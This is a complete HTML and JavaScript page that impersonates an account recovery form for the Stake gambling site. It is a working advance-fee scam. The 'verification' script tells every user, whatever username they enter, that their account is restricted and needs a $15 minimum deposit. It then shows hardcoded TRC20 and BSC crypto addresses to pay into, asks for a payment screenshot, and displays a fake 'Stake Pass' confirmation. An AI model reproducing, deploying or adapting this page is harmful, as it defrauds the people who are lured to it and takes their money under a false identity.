<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Stake Account Recovery</title>
  <style>
    body {
      background-color: #0e0e0e;
      color: #fff;
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    .container {
      max-width: 500px;
      margin: auto;
      background: #1c1c1c;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.6);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    input, select, button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }
    button {
      background-color: #4CAF50;
      color: white;
      cursor: pointer;
    }
    button:disabled {
      background-color: #555;
      cursor: not-allowed;
    }
    .readonly-input {
      background-color: #333;
      color: #fff;
    }
    .copy-btn {
      background-color: #333;
      color: white;
      border: none;
      margin-top: 5px;
      cursor: pointer;
    }
    .message, .popup {
      margin-top: 15px;
      padding: 10px;
      background-color: #222;
      border-left: 5px solid #4CAF50;
    }
    .popup {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #1c1c1c;
      padding: 20px;
      border-radius: 10px;
      z-index: 1000;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Account Recovery</h2>
    <label>Username:</label>
    <input type="text" id="username" placeholder="Enter your Stake username">
    <button onclick="verifyUsername()">Verify</button>
    <div id="verifyMessage" class="message" style="display:none"></div>

    <label>Coin:</label>
    <select id="coin" onchange="updateAddress()">
      <option value="">Select Coin</option>
      <option value="USDT">USDT</option>
      <option value="BTC">BTC</option>
      <option value="TRX">TRX</option>
      <option value="Ethereum">Ethereum</option>
    </select>

    <label>Network:</label>
    <select id="network" onchange="updateAddress()">
      <option value="">Select Network</option>
      <option value="TRC20">TRC20</option>
      <option value="BSC">BSC</option>
    </select>

    <label>Address:</label>
    <input type="text" id="address" class="readonly-input" readonly>
    <button class="copy-btn" onclick="copyAddress()">Copy Address</button>

    <label>Amount ($):</label>
    <input type="number" id="amount" placeholder="Enter amount">

    <label>Upload Screenshot:</label>
    <input type="file" id="screenshot">

    <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
  </div>

  <div class="popup" id="popup">
    <p>Your account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.</p>
    <button onclick="closePopup()">OK</button>
  </div>

  <script>
    const addresses = {
      USDT: {
        TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
      },
      BTC: {
        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
      },
      TRX: {
        TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
      },
      Ethereum: {
        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
      }
    };

    function updateAddress() {
      const coin = document.getElementById("coin").value;
      const network = document.getElementById("network").value;
      const addressInput = document.getElementById("address");
      if (addresses[coin] && addresses[coin][network]) {
        addressInput.value = addresses[coin][network];
      } else {
        addressInput.value = "";
      }
      checkFields();
    }

    function copyAddress() {
      const address = document.getElementById("address");
      address.select();
      document.execCommand("copy");
      alert("Address copied to clipboard");
    }

    function verifyUsername() {
      const username = document.getElementById("username").value;
      if (username) {
        const msg = document.getElementById("verifyMessage");
        msg.style.display = "block";
        msg.innerHTML = "Verifying...";
        setTimeout(() => {
          msg.innerHTML = "Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.";
          checkFields();
        }, 1500);
      }
    }

    function checkFields() {
      const username = document.getElementById("username").value;
      const coin = document.getElementById("coin").value;
      const network = document.getElementById("network").value;
      const address = document.getElementById("address").value;
      const amount = document.getElementById("amount").value;
      const screenshot = document.getElementById("screenshot").files.length;
      const verified = document.getElementById("verifyMessage").innerHTML.includes("withdraw-only mode");
      document.getElementById("submitBtn").disabled = !(username && coin && network && address && amount && screenshot && verified);
    }

    document.querySelectorAll("input, select").forEach(el => {
      el.addEventListener("change", checkFields);
      el.addEventListener("input", checkFields);
    });

    function submitForm() {
      document.getElementById("popup").style.display = "block";
    }

    function closePopup() {
      location.reload();
    }
  </script>
</body>
</html>
